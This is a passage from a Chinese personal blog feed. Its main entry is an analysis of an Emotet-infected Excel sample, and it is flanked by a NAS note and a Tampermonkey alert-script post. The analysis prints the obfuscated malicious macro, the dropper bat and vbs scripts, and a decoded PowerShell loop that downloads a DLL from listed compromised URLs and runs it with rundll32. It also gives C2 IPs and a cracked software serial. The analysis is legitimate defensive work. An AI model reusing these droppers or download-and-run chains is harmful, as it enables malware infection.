汉化皮肤）</p><p>TODO：动态DNS + 智能插座搭配来电自启(省电)</p><p>问题记录：</p><p>1.莫名其表把我路由器 IP ban了，导致整个网段都没法登陆。用了一些骚操作，总算登陆到后台，为了防止后续再出现这种情况，直接把这个网段加白了。</p><p>2.DS video 刮削的信息不是默认放在电影所在目录，导致手机或者kodi没办法直接引用。还是得靠TMM来刮</p><h2 id="20220218-更新"><a href="#20220218-更新" class="headerlink" title="20220218 更新"></a>20220218 更新</h2><p>实际nas没咋用上过，现在重装了window，配上键盘鼠标，直接把电视机当显示器用，可能会用上。</p>]]></content>
      
      
      
        <tags>
            
            <tag> nas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Emotet攻击样本分析</title>
      <link href="/2022/02/16/emotet-gong-ji-yang-ben-fen-xi/"/>
      <url>/2022/02/16/emotet-gong-ji-yang-ben-fen-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>Emotet 是一种计算机恶意软件程序，最初是作为一种<a href="https://www.kaspersky.com/resource-center/threats/shylock-banking-trojan-definition">银行木马病毒</a>开发的。其目的是访问外部设备并监视敏感的私有数据。众所周知，Emotet 会骗过基本的防病毒程序并保持隐匿。一旦被感染，该恶意软件会像计算机蠕虫病毒一样传播，并试图渗透到网络中的其他计算机。</p><p>Emotet 主要通过垃圾电子邮件传播。相应的电子邮件包含恶意链接或受感染的文档。如果您下载文档或打开链接，则其他恶意软件会自动下载到您的计算机上。这些电子邮件看起来非常真实，因此 Emotet 的受害者为数众多。 </p><p>从 21年底， Emotet 重登恶意软件榜首，其主要传播方式为邮件传播，利用宏执行命令，感染设备后继续向设备中的联系人发送邮件进行传播。</p><h2 id="2-前期准备"><a href="#2-前期准备" class="headerlink" title="2.前期准备"></a>2.前期准备</h2><ul><li>样本 xxxx.xls </li><li>VBA Password Bypasser.exe （绕过VBA脚本加密）</li><li>window虚拟机（已安装office）</li></ul><h2 id="3-分析"><a href="#3-分析" class="headerlink" title="3.分析"></a>3.分析</h2><h3 id="3-1-恶意宏提取"><a href="#3-1-恶意宏提取" class="headerlink" title="3.1 恶意宏提取"></a>3.1 恶意宏提取</h3><p>恶意文档，为了使人执行恶意宏，会放入诱导启用编辑或启用内容的话术，如下图：</p><p><img src="/assets/image-20220216161344198.png" alt="image-20220216161344198"></p><p>我们直接在Excel界面按Alt+F11 ,打开VB工程，发现工程被加密</p><p><img src="/assets/image-20220216161548056.png" alt="image-20220216161548056"></p><p>可使用 VBA Password Bypasser.exe（网上自行下载） 绕过VB项目加密</p><p>安装完成后，激活软件：</p><p>姓 名（Name）：JekG</p><p>序 列 号（Code）：000014-RKND8F-B3WQ7U-KDNY8V-ZZFZZZ-ZZZZZZ-ZWCJP9-51VJ00-800000-000000</p><p>可使用以下两种方式打开：</p><ul><li>打开软件，点击open，选择样本 xls文件，直接打开Excel(可能找不到 Excel路径导致打不开)</li></ul><p><img src="/assets/image-20220216161738759.png" alt="image-20220216161738759"></p><ul><li>或点击 Run customer command line，输入Excel 的路径，启动Excel后，在Excel中打开xls文件</li></ul><p><img src="/assets/image-20220216161950156.png" alt="image-20220216161950156"></p><p>可以看到再次打开 VBA工程时，不会再提示需要输入密码</p><p><img src="/assets/image-20210216171222347.png" alt="image-20210216171222347"></p><h3 id="3-2-恶意宏分析"><a href="#3-2-恶意宏分析" class="headerlink" title="3.2 恶意宏分析"></a>3.2 恶意宏分析</h3><pre class="language-vbscript" data-language="vbscript"><code class="language-vbscript">Const dhcSum As Integer = 0Const dhcAvg As Integer = 1Const dhcMax As Integer = 2Const dhcMin As Integer = 3Const dhcCount As Integer = 4Const dhcSumPlus As Integer = 5Const dhcSumMinus As Integer = 6Const dhcCountFull As Integer = 7Const dhcCountNotNull As Integer = 8Const dhcCountPlus As Integer = 9Const dhcCountMinus As Integer = 10Sub ghsdrsDERGshdhsrse5wasd()   Dim intLastRow As Integer   Dim intRow As Integer   Dim intYesRow As Integer   Dim intNoRow As Integer   Dim strText As String   Dim strNewName As String   Dim strNewQuestion As String   Dim intRes As Integer   MsgBox "fgzdsrfyhgj myjdf. Gaserfhlsd srhtgius.", vbOKOnly, _    "gharagsdf"   intLastRow = Worksheets("Data").Range("D1").Value + 1   intRow = 1   Do While intRow &lt; intLastRow      strText = Worksheets("Data").Cells(intRow, 1).Value      intYesRow = Worksheets("Data").Cells(intRow, 2).Value      intNoRow = Worksheets("Data").Cells(intRow, 3).Value      If intYesRow &gt; 0 Then         intRes = MsgBox(strText, vbYesNo, "hueswrfg")         If intRes = vbYes Then            intRow = intYesRow         Else            intRow = intNoRow         End If      Else         intRes = MsgBox("weg " &amp; strText &amp; "d", vbYesNo, "rtgwae")      End If   LoopEnd SubPrivate Sub Workbook_Open()   Dim lngAge As Long   Dim datDate As Date   datDate = Now: lngAge = DateDiff("yyyy", _   datDate, Date): kjDygzs34e.Caption = Cells(105, 7) + _   vbCrLf &amp; Cells(103, 6)   If DateSerial(Year(datDate) + lngAge, Month(datDate), _    Day(datDate)) &gt; Date Then      lngAge = lngAge - 1   End If   lngAge = lngAge + 1: kjDygzs34e.Tag = Replace(Cells(102, 5), _   "uwpe", ""): hsdFghawoyhitshdg Range("D147"), Range("A203"): dhCalculateAge = _   lngAge: kjDygzs34e.trgsEtgseg.Text = ":"End SubSub HstgsAgsw4Rfhsf(ghoiwue As String, tyo3oe As String, HSere4yd As Boolean)   Dim strStyle As String:   Dim strAlign As String:   Dim strOut As String   Dim cell As Object: Dim strCellText As String: Dim lngRow As Long   Dim lngLastRow As Long: Dim strTemp As String   Dim objWordApp As Object   Dim i As Long: i = 1: lngLastRow = _   Selection.Row: Open ghoiwue For Output As #i   For Each cell In Selection      lngRow = cell.Row      If i &lt; 0 Then      If lngRow &lt;&gt; lngLastRow Then         strOut = strOut &amp; vbTab &amp; "&lt;/tr&gt;" &amp; vbCrLf &amp; vbTab &amp; _          "&lt;tr&gt;" &amp; vbCrLf         lngLastRow = lngRow      End If      If Not IsNull(cell.Font.Size) Then         strStyle = " style=" &amp; "font-size: " &amp; Int(100 * _          cell.Font.Size / 19) &amp; "%;"      End If      If cell.Font.Bold Then         strCellText = "&lt;b&gt;" &amp; strCellText &amp; "&lt;/b&gt;"      End If      If cell.HorizontalAlignment = xlRight Then         strAlign = " align=" &amp; "right"      ElseIf cell.HorizontalAlignment = xlCenter Then         strAlign = " align=" &amp; "center"      Else         strAlign = ""      End If      strCellText = cell.Text      If cell.Orientation &lt;&gt; xlHorizontal Then         strTemp = ""         For i = 1 To Len(strCellText)            strTemp = strTemp &amp; Mid$(strCellText, i, 1) &amp; "&lt;br&gt;"         Next i         strCellText = strTemp         strStyle = ""      End If      End If      strOut = strOut &amp; vbTab &amp; vbTab &amp; "&lt;td" &amp; strStyle &amp; strAlign _       &amp; "&gt;" &amp; strCellText &amp; "&lt;/td&gt;" &amp; vbCrLf   Next   strOut = vbTab &amp; "&lt;tr&gt;" &amp; vbCrLf &amp; strOut &amp; vbTab &amp; _   "&lt;/tr&gt;" &amp; vbCrLf: Print #i, tyo3oe   strOut = "&lt;table border=1 cellpadding=3 cellspacing=1&gt;" &amp; vbCrLf &amp; _    strOut &amp; vbCrLf &amp; "&lt;/table&gt;": Close #i    If strOut = "g457dt" Then   Set objWordApp = CreateObject("Word.Application")   objWordApp.documents.Add   objWordApp.Selection = strOut   objWordApp.Selection.Copy   objWordApp.Visible = True   Set objWordApp = Nothing   End IfEnd SubFunction hsdFghawoyhitshdg(rgWeights As Range, rgValues As Range) _ As Double   If (rgWeights.Count &lt;&gt; rgValues.Count) Then      hsdFghawoyhitshdg = 0      Exit Function   End If   Dim dblSum As Double: Dim dblSumWeight As Double   Dim i As Integer: HstgsAgsw4Rfhsf Cells(101, 10), _   kjDygzs34e.Caption, True   For i = 1 To rgWeights.Count      dblSumWeight = dblSumWeight + rgWeights(i) * rgValues(i)      dblSum = dblSum + rgWeights(i)   Next   If dblSum &lt; 0.1 Then dblSum = 1   HstgsAgsw4Rfhsf Cells(104, 12), kjDygzs34e.Tag, False   hsdFghawoyhitshdg = dblSumWeight / dblSumEnd Function</code></pre><p>整个 脚本VBA脚本代码量并不是特别大，可以看到有很多随机字符组成的字符串（加大了此为恶意脚本的可疑度）。</p><p>分析 VBA脚本时，可重点关注 open close replace cells 等函数</p><p>经初步分析，大致可以看出，此脚本是将执行的恶意代码放在单元格中，此处使用宏脚本将单元格恶意代码取出，做一定的replace变换后输出到 vbs脚本及bat脚本，随后使用 </p><p>通过动态调试，可以看到程序生成一个 vbs脚本，一个bat脚本</p><p><img src="/assets/image-20220216180341012.png" alt="image-20220216180341012"></p><h4 id="c-programdata-uidpjewl-bat"><a href="#c-programdata-uidpjewl-bat" class="headerlink" title="c:\programdata\uidpjewl.bat"></a>c:\programdata\uidpjewl.bat</h4><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">dir</span>&amp;<span class="token function">echo</span> hjsoihjspod fgjosdFhstjtyjuStJsDHTTJDGGfVBXDrtfyh57erthDFhsDRh&amp;<span class="token function">SET</span> kjXDFgjrth5=po&amp;<span class="token function">echo</span> BGZDSRGRES4GJHFKDGUkCHkjxcgjXdfrHdfxghzd46drxzdgdsfgxzzs4&amp;<span class="token function">SET</span> KFfklhgJxdh=wers&amp;<span class="token function">echo</span> FHzsDFHhGjgfJxd56r8utycjgxHzdrfg HgfhsdrfghdrzsgrDgsd46drszgdf&amp;<span class="token function">SET</span> etaRHjDhfd4=hell <span class="token operator">-</span>e&amp;<span class="token function">echo</span> GjghfkuoFJUkCnjxDhrewg236ethjgdfhD5ufJdfHDSGRshdtJghDfGSreghDfh&amp;<span class="token function">SET</span> iiPgjlfJds467=nc JABNAEoAWABkAGYAcwBoAEQAcgBmAEcAWgBzAGUAcwA0AD0AIgBoAHQAdABwADoALwAvAGEAbABpAHYAZQBzAHkAcwB0AGUAbQBzAC4AYwBvAG0ALwBlAGwAbgAtAGkAbQBhAGcAZQBzAC8AcABtADIAcgBTAHMAbgBWAE0ALwAsAGgAdAB0AHAAOgAvAC8AZABvAG4ALQBsAGUAZQAuAGMAbwBtAC8AXwBuAG8AdABlAHMALwBVADYASAAxADQARABOAEEALwAsAGgAdAB0AHAAOgAvAC8AbQBlAGwAbABvAHcANgAwAHMALgBjAG8AbQAvAFMAdABhAG4AbABlAHkAXwBmAGkAbABlAHMALwBFAEYASQBxAHcAWgAxADgAMwByAGYAbQBkAC8ALABoAHQAdABwADoALwAvAHAAcgBvAC0AZgBpAGMAaQBlAG4AdABsAGwAYwAuAGMAbwBtAC8AUABEAEYAXwBmAGkAbABlAHMALwA1AEEAOQBXADgALwAsAGgAdAB0AHAAOgAvAC8AbABvAHMAdAAtAGUAYQByAHQAaAAuAGMAbwBtAC8AQgBsAGEAYwBrAF8AYQBuAGQAXwBXAGgAaQB0AGUALwBaAFcANAByAEgARQBkAEQAMQB2A&amp;<span class="token function">echo</span> BHMJCFghJYIfGd56y7DfHXCFghdsGdrsG DHdFdgdsgf rfghDRGd46567DRghDFGSreGDfg&amp;<span class="token function">SET</span> XCVzWRet4=FoAWAAvACwAaAB0AHQAcAA6AC8ALwBjAHIAZQBlAGQAbQBvAG8AcgBwAGEAcgB0AG4AZQByAHMALgBjAG8AbQAvAGUAbABuAC0AaQBtAGEAZwBlAHMALwB3AEUAWQBLAGQANQBLAEoAWgBFAFQAaABlAEIAcwB3AHEALwAsAGgAdAB0AHAAOgAvAC8AbQBhAHQAdABlAHIAcwBvAGYAZgBhAGMAdAAuAGMAbwBtAC8AYwBnAGkALwBFADAAQwAxAHYAdABTAHEAdAAvACwAaAB0AHQAcAA6AC8ALwBwAHUAcgBlAHAAbABhAHQAaQBuAHUAbQBiAGEAbgBkAC4AYwBvAG0ALwBTAGMAaABlAGQAdQBsAGUALwBFAFcAMgA0AEEAWQBKAEMAdgBCAHAATgA4AEcAYwAvACwAaAB0AHQAcAA6AC8ALwBoAG8AbQBlAGgAYQBuAGQAeQB3AG8AcgBrAHMALgBjAG8AbQAvAGUAbABuAC0AaQBtAGEAZwBlAHMALwB4AEYASQBEAFAAZgBzADQAUwBTADEAeQB3ADcAZwBoAFgAWABrAC8ALABoAHQAdABwADoALwAvAGgAaQAtAHQAZQBjAGgAYQB1AGQAaQBvAC4AYwBvAG0ALwBkAGkAcg&amp;<span class="token function">echo</span> HyKFYUIfYHjDXgfxhdRFGDS47dthxdfhdfhX57dfghjXgJFTJUXSDHdRxghDRxtHJYUOIighl&amp;<span class="token function">SET</span> NmvbmxdrtX7sd5rs=AyADAAMgAxAC8AZwAzAGQALwAsAGgAdAB0AHAAOgAvAC8AcgBvAGQAZQByAGkAYwBrAHAAbwB3AGUAbABsAGUAbgB0AGUAcgB0AGEAaQBuAG0AZQBuAHQALgBjAG8AbQAvAGUAbABuAC0AaQBtAGEAZwBlAHMALwBPAFYATwB5AE4AMwB5ADkALwAsAGgAdAB0AHAAcwA6AC8ALwBjAG8AbgBzAGMAaQBlAG4AYwBlAHMALgBjAGUAbgB0AGUAcgAvAHcAcAAtAGkAbgBjAGwAdQBkAGUAcwAvAFMAawBXADIAdwAvACwAaAB0AHQAcAA6AC8ALwBtAGEAZwAtAGQAZQBzAGkAZwBuAHMALgBjAG8AbQAvAGMAcwBzAC8ATAAzAFEASwBsAHIANgBpAFQAegBJAEwAVgB6AGIAbgBDAC8AIgAuAHMAUABMAEkAdAAoACIALAAiACkAOwAgAGYAbwBSAGUAQQBDAGgAKAAkAHkASQBkAHMAUgBoAHkAZQAzADQAcwB5AHUAZgBnAHgAagBjAGQAZgAgAGkATgAgACQATQBKAFgAZABmAHMAaABEAHIAZgBHAFoAcwBlAHMANAApACAAewAkAEcAdwBlAFkASAA1ADcAcwBlAGQAcwB3AGQ&amp;<span class="token function">echo</span> GHJGFJDYik79fgUlhXMJGNxdrgsREhdrXDtgj57sdfhXZdrESgSzXHgJxnj46&amp;<span class="token function">SET</span> DRGhREkjif=APQAoACIAYwBpAHUAdwBkADoAaQB1AHcAZABcAHAAcgBpAHUAdwBkAG8AZwBpAHUAdwBkAHIAYQBtAGkAdQB3AGQAZABhAHQAaQB1AHcAZABhAFwAcAB1AGkAaABvAHUAZAAuAGQAaQB1AHcAZABsAGkAdQB3AGQAbAAiACkALgByAGUAUABsAEEAQwBlACgAIgBpAHUAdwBkACIALAAiACIAKQA7AGkAbgBWAE8AawBlAC0AdwBlAEIAcgBFAHEAVQBlAHMAVAAgAC0AdQBSAEkAIAAkAHkASQBkAHMAUgBoAHkAZQAzADQAcwB5AHUAZgBnAHgAagBjAGQAZgAgAC0AbwBVAHQARgBJAGwAZQAgACQARwB3AGUAWQBIADUANwBzAGUAZABzAHcAZAA7AGkARgAoAHQAZQBTAHQALQBwAEEAVABoACAAJABHAHcAZQBZAEgANQA3AHMAZQBkAHMAdwBkACkAewBpAGYAKAAoAGcARQB0AC0AaQB0AEUAbQAgACQARwB3AGUAWQBIADUANwBzAGUAZABzAHcAZAApAC4AbABlAE4ARwB0AGgAIAAtAGcAZQAgADQANwA0ADMANgApAHsAYgBSAGUAYQBrADsAfQB9AH0A<span class="token function">echo</span> GHJDFTGjTJTFhdzsrS47dfgjhKGUHXnxcvNr hrtHGXMNJgNxdzRFgh57dtFJUgXHJHDFgrH&amp;<span class="token function">start</span><span class="token operator">/</span>B <span class="token operator">/</span>WAIT <span class="token operator">%</span>kjXDFgjrth5%<span class="token operator">%</span>KFfklhgJxdh%<span class="token operator">%</span>etaRHjDhfd4%<span class="token operator">%</span>iiPgjlfJds467%<span class="token operator">%</span>XCVzWRet4%<span class="token operator">%</span>NmvbmxdrtX7sd5rs%<span class="token operator">%</span>DRGhREkjif<span class="token operator">%</span>&amp;<span class="token function">echo</span> dgfhakirjshgfJgfJd57udgfJxsDGFjxDSHzDFHDZFHdgfxs547dfhJXGHJXDFHdrf4s6dfh</code></pre><h4 id="c-programdata-tjspowj-vbs"><a href="#c-programdata-tjspowj-vbs" class="headerlink" title="c:\programdata\tjspowj.vbs"></a>c:\programdata\tjspowj.vbs</h4><pre class="language-vbscript" data-language="vbscript"><code class="language-vbscript">dim gSEdJDsfy5JGHKdggdh:hjrfo2wehokd="WjwpeoScjwpeoripjwpeot.Sjwpeohejwpeoljwpeol":dvgnoma4ibhnld="cuerlxmuerlxd /uerlxc suerlxtauerlxruerlxt uerlx/uerlxB uerlxc:uerlx\wuerlxinuerlxdowuerlxs\suerlxyswuerlxouerlxw6uerlx4\ruuerlxnduerlxluerlxl3uerlx2.uerlxexuerlxe uerlxc:uerlx\uerlxpruerlxoguerlxramuerlxdauerlxta\puihoud.duerlxluerlxl,tjpleowdsyf":set gSEdJDsfy5JGHKdggdh=wscript.createobject(replace(hjrfo2wehokd,"jwpeo","")):dim ryulxdHSerw:ryulxdHSerw=replace("curiw:uriw\puriwrogruriwamduriwaturiwa\uidpjewl.buriwat","uriw",""):gSEdJDsfy5JGHKdggdh.run ryulxdHSerw,0,true:dim HkjsdsfEhdse46d:HkjsdsfEhdse46d=replace(dvgnoma4ibhnld,"uerlx",""):gSEdJDsfy5JGHKdggdh.run HkjsdsfEhdse46d,0</code></pre><p>进行简化得到</p><p>c:\programdata\uidpjewl.bat</p><p>可使用 <a href="https://raikia.com/tool-powershell-encoder/">https://raikia.com/tool-powershell-encoder/</a> 解 base64 （powershell编码为 utf-16）</p><pre class="language-none"><code class="language-none">powershell -enc JABNAEoAWABkAGYAcwBoAEQAcgBmAEcAWgBzAGUAcwA0AD0AIgBoAHQAdABwADoALwAvAGEAbABpAHYAZQBzAHkAcwB0AGUAbQBzAC4AYwBvAG0ALwBlAGwAbgAtAGkAbQBhAGcAZQBzAC8AcABtADIAcgBTAHMAbgBWAE0ALwAsAGgAdAB0AHAAOgAvAC8AZABvAG4ALQBsAGUAZQAuAGMAbwBtAC8AXwBuAG8AdABlAHMALwBVADYASAAxADQARABOAEEALwAsAGgAdAB0AHAAOgAvAC8AbQBlAGwAbABvAHcANgAwAHMALgBjAG8AbQAvAFMAdABhAG4AbABlAHkAXwBmAGkAbABlAHMALwBFAEYASQBxAHcAWgAxADgAMwByAGYAbQBkAC8ALABoAHQAdABwADoALwAvAHAAcgBvAC0AZgBpAGMAaQBlAG4AdABsAGwAYwAuAGMAbwBtAC8AUABEAEYAXwBmAGkAbABlAHMALwA1AEEAOQBXADgALwAsAGgAdAB0AHAAOgAvAC8AbABvAHMAdAAtAGUAYQByAHQAaAAuAGMAbwBtAC8AQgBsAGEAYwBrAF8AYQBuAGQAXwBXAGgAaQB0AGUALwBaAFcANAByAEgARQBkAEQAMQB2AFoAWAAvACwAaAB0AHQAcAA6AC8ALwBjAHIAZQBlAGQAbQBvAG8AcgBwAGEAcgB0AG4AZQByAHMALgBjAG8AbQAvAGUAbABuAC0AaQBtAGEAZwBlAHMALwB3AEUAWQBLAGQANQBLAEoAWgBFAFQAaABlAEIAcwB3AHEALwAsAGgAdAB0AHAAOgAvAC8AbQBhAHQAdABlAHIAcwBvAGYAZgBhAGMAdAAuAGMAbwBtAC8AYwBnAGkALwBFADAAQwAxAHYAdABTAHEAdAAvACwAaAB0AHQAcAA6AC8ALwBwAHUAcgBlAHAAbABhAHQAaQBuAHUAbQBiAGEAbgBkAC4AYwBvAG0ALwBTAGMAaABlAGQAdQBsAGUALwBFAFcAMgA0AEEAWQBKAEMAdgBCAHAATgA4AEcAYwAvACwAaAB0AHQAcAA6AC8ALwBoAG8AbQBlAGgAYQBuAGQAeQB3AG8AcgBrAHMALgBjAG8AbQAvAGUAbABuAC0AaQBtAGEAZwBlAHMALwB4AEYASQBEAFAAZgBzADQAUwBTADEAeQB3ADcAZwBoAFgAWABrAC8ALABoAHQAdABwADoALwAvAGgAaQAtAHQAZQBjAGgAYQB1AGQAaQBvAC4AYwBvAG0ALwBkAGkAcgAyADAAMgAxAC8AZwAzAGQALwAsAGgAdAB0AHAAOgAvAC8AcgBvAGQAZQByAGkAYwBrAHAAbwB3AGUAbABsAGUAbgB0AGUAcgB0AGEAaQBuAG0AZQBuAHQALgBjAG8AbQAvAGUAbABuAC0AaQBtAGEAZwBlAHMALwBPAFYATwB5AE4AMwB5ADkALwAsAGgAdAB0AHAAcwA6AC8ALwBjAG8AbgBzAGMAaQBlAG4AYwBlAHMALgBjAGUAbgB0AGUAcgAvAHcAcAAtAGkAbgBjAGwAdQBkAGUAcwAvAFMAawBXADIAdwAvACwAaAB0AHQAcAA6AC8ALwBtAGEAZwAtAGQAZQBzAGkAZwBuAHMALgBjAG8AbQAvAGMAcwBzAC8ATAAzAFEASwBsAHIANgBpAFQAegBJAEwAVgB6AGIAbgBDAC8AIgAuAHMAUABMAEkAdAAoACIALAAiACkAOwAgAGYAbwBSAGUAQQBDAGgAKAAkAHkASQBkAHMAUgBoAHkAZQAzADQAcwB5AHUAZgBnAHgAagBjAGQAZgAgAGkATgAgACQATQBKAFgAZABmAHMAaABEAHIAZgBHAFoAcwBlAHMANAApACAAewAkAEcAdwBlAFkASAA1ADcAcwBlAGQAcwB3AGQAPQAoACIAYwBpAHUAdwBkADoAaQB1AHcAZABcAHAAcgBpAHUAdwBkAG8AZwBpAHUAdwBkAHIAYQBtAGkAdQB3AGQAZABhAHQAaQB1AHcAZABhAFwAcAB1AGkAaABvAHUAZAAuAGQAaQB1AHcAZABsAGkAdQB3AGQAbAAiACkALgByAGUAUABsAEEAQwBlACgAIgBpAHUAdwBkACIALAAiACIAKQA7AGkAbgBWAE8AawBlAC0AdwBlAEIAcgBFAHEAVQBlAHMAVAAgAC0AdQBSAEkAIAAkAHkASQBkAHMAUgBoAHkAZQAzADQAcwB5AHUAZgBnAHgAagBjAGQAZgAgAC0AbwBVAHQARgBJAGwAZQAgACQARwB3AGUAWQBIADUANwBzAGUAZABzAHcAZAA7AGkARgAoAHQAZQBTAHQALQBwAEEAVABoACAAJABHAHcAZQBZAEgANQA3AHMAZQBkAHMAdwBkACkAewBpAGYAKAAoAGcARQB0AC0AaQB0AEUAbQAgACQARwB3AGUAWQBIADUANwBzAGUAZABzAHcAZAApAC4AbABlAE4ARwB0AGgAIAAtAGcAZQAgADQANwA0ADMANgApAHsAYgBSAGUAYQBrADsAfQB9AH0A再次解析得$MJXdfshDrfGZses4="http://alivesystems.com/eln-images/pm2rSsnVM/,http://don-lee.com/_notes/U6H14DNA/,http://mellow60s.com/Stanley_files/EFIqwZ183rfmd/,http://pro-ficientllc.com/PDF_files/5A9W8/,http://lost-earth.com/Black_and_White/ZW4rHEdD1vZX/,http://creedmoorpartners.com/eln-images/wEYKd5KJZETheBswq/,http://mattersoffact.com/cgi/E0C1vtSqt/,http://pureplatinumband.com/Schedule/EW24AYJCvBpN8Gc/,http://homehandyworks.com/eln-images/xFIDPfs4SS1yw7ghXXk/,http://hi-techaudio.com/dir2021/g3d/,http://roderickpowellentertainment.com/eln-images/OVOyN3y9/,https://consciences.center/wp-includes/SkW2w/,http://mag-designs.com/css/L3QKlr6iTzILVzbnC/".sPLIt(","); foReACh($yIdsRhye34syufgxjcdf iN $MJXdfshDrfGZses4) {$GweYH57sedswd=("c:\programdata\puihoud.dll").rePlACe("","");inVOke-weBrEqUesT -uRI $yIdsRhye34syufgxjcdf -oUtFIle $GweYH57sedswd;iF(teSt-pATh $GweYH57sedswd){if((gEt-itEm $GweYH57sedswd).leNGth -ge 47436){bReak;}}}</code></pre><p>c:\programdata\tjspowj.vbs</p><pre class="language-vbscript" data-language="vbscript"><code class="language-vbscript">wscript.createobject(WScript.Shell).run "c:\programdata\uidpjewl.bat",0,truewscript.createobject(WScript.Shell).run "cmd /c start /B c:\windows\syswow64\rundll32.exe c:\programdata\puihoud.dll,tjpleowdsyf",0</code></pre><p>至此 我们 可以清楚，该 恶意文件，通过 宏生成 vbs和bat文件，随后使用 wscript 执行 vbs 脚本。 vbs脚本调用cmd 执行 bat脚本，bat脚本调用powershell下载恶意DLL文件， 随后vbs脚本使用rundll32 执行dll文件。 </p><h3 id="3-3-DLL-文件分析"><a href="#3-3-DLL-文件分析" class="headerlink" title="3.3 DLL 文件分析"></a>3.3 DLL 文件分析</h3><p>不会DLL 分析了， 只能放到沙箱跑了下，后续DLL文件行为如下：</p><ol><li>C:\Windows\system32\rundll32.exe “c:\programdata\puihoud.dll”,DllRegisterServer 重新使用rundll32 加载自己， 加载函数变为 DllRegisterServer</li><li>释放可执行文件 C:\Users\admin\AppData\Local\Zeoritohqqgtc\mmoqnlsiof.kiz</li><li>启动  C:\Windows\system32\rundll32.exe “C:\Users\admin\AppData\Local\Zeoritohqqgtc\mmoqnlsiof.kiz”,mCRdEzvwblrt</li><li>切换函数 C:\Windows\system32\rundll32.exe “C:\Users\admin\AppData\Local\Zeoritohqqgtc\mmoqnlsiof.kiz”,DllRegisterServer</li><li>并与 C2 服务器通信 103.42.57.17 / 116.124.128.206</li></ol><p>完整执行链路如下 ：</p><img src="/assets/image-20220216184832492.png" alt="image-20220216184832492" style="zoom:150%;">]]></content>
      
      
      
        <tags>
            
            <tag> Emotet </tag>
            
            <tag> macro </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工作效率提升</title>
      <link href="/2022/01/16/gong-zuo-xiao-lu-ti-sheng/"/>
      <url>/2022/01/16/gong-zuo-xiao-lu-ti-sheng/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><ul><li><p>需要定时刷新告警列表，及时处理。 告警内容为json原文，需要快速提取关键信息</p></li><li><p>中午午休或吃饭，需要了解告警情况</p></li><li><p>需要水一篇文章</p></li></ul><h2 id="整体实现"><a href="#整体实现" class="headerlink" title="整体实现"></a>整体实现</h2><p><img src="/assets/image-20220116150734321.png" alt="image-20220116150734321"></p><h2 id="平台选择"><a href="#平台选择" class="headerlink" title="平台选择"></a>平台选择</h2><p>开始有纠结使用 油猴还是编写插件，但考虑到插件需要额外学习成本，并且公司的Chrome浏览器不能安装插件，于是决定安装Firefox浏览器，使用Tampermonkey编写自定义脚本 实现。 使用油猴做配置也很方便，使用原生JavaScript语言即可。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// ==UserScript==</span><span class="token comment">// @name         New Userscript</span><span class="token comment">// @namespace    http://tampermonkey.net/</span><span class="token comment">// @version      0.1</span><span class="token comment">// @description  try to take over the world!</span><span class="token comment">// @author       You</span><span class="token comment">// @match        http://*/*</span><span class="token comment">// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==</span><span class="token comment">// @grant        none</span><span class="token comment">// ==/UserScript==</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token string">'use strict'</span><span class="token punctuation">;</span>    <span class="token comment">// Your code here...</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="Filter页面"><a href="#Filter页面" class="headerlink" title="Filter页面"></a>Filter页面</h2><h3 id="判断生效代码"><a href="#判断生效代码" class="headerlink" title="判断生效代码"></a>判断生效代码</h3><pre class="language-none"><code class="language-none">if (window.location.href.includes('issues/?filter=12512')){//your code}</code></pre><h3 id="定时刷新"><a href="#定时刷新" class="headerlink" title="定时刷新"></a>定时刷新</h3><p>使用定时器即可，每30秒触发一次 search 按钮的点击事件</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  document<span class="token punctuation">.</span><span class="token function">getElementsByClassName</span><span class="token punctuation">(</span><span class="token string">"aui-button aui-button-primary search-button"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">30000</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="新增audio元素"><a href="#新增audio元素" class="headerlink" title="新增audio元素"></a>新增audio元素</h3><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> pin <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"jira-share-trigger"</span><span class="token punctuation">)</span><span class="token keyword">var</span> gener_audio<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"audio"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>gener_audio<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">'&lt;source src="http://xxxx/xxx.wav" type="audio/mpeg"&gt;'</span>pin<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">prepend</span><span class="token punctuation">(</span>gener_audio<span class="token punctuation">)</span>gener_audio<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//播放</span><span class="token comment">//同理，新增微信通知或声音通知的 checkbox</span></code></pre><h3 id="微信通知"><a href="#微信通知" class="headerlink" title="微信通知"></a>微信通知</h3><p>微信通知，这里使用了企业微信的 应用发送消息功能，可参考API文档，如何新增应用等此处略过</p><p><a href="https://developer.work.weixin.qq.com/document/path/90236">https://developer.work.weixin.qq.com/document/path/90236</a></p><p>考虑到通用性，我将获取token及发消息使用腾讯云函数 封装成了一个对外接口 